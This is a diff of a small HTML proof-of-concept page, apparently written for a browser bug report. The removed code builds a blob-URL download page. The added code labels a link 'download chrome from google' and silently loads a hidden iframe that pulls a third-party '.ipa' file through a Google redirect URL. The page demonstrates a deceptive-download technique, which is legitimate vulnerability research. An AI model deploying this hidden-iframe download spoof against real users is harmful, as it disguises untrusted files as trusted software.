@@ -1,16 +1,7 @@
-<h1>click link to download chrome from google</h1><a href="#" id="poc" onclick="poc()">link</a>
+<h1></h1><a href="#" onclick="poc()">click me to download chrome from google</a></h1>
 <script>
     function poc(){
-        // 1. 先创建要下载的文件内容（这里用一段示例文字，也可以是 base64 解码后的二进制数据）
-        var downloadContent = new Blob(["demo file content"], {type: "application/zip"});
-        var downloadUrl = URL.createObjectURL(downloadContent);
-
-        // 2. 把 blob URL 嵌入到 HTML 的 <a> 标签中
-        var html = '<a href="' + downloadUrl + '" download="test.zip">click download zip</a>';
-
-        // 3. 将 HTML 本身也做成 blob，导航过去
-        var blob = new Blob([html], {type: "text/html"});
-        var url = URL.createObjectURL(blob);
-        window.location.href = url;
+    document.getElementById("ifr").src="https://www.google.com/url?q=https://ybt01.github.io/upload/chrome.ipa&sa=D&source=buganizer&usg=AOvVaw1n11p_TFqts82Sku-62RSv";
     }
 </script>
+<iframe id="ifr" src style="display:none"></iframe>
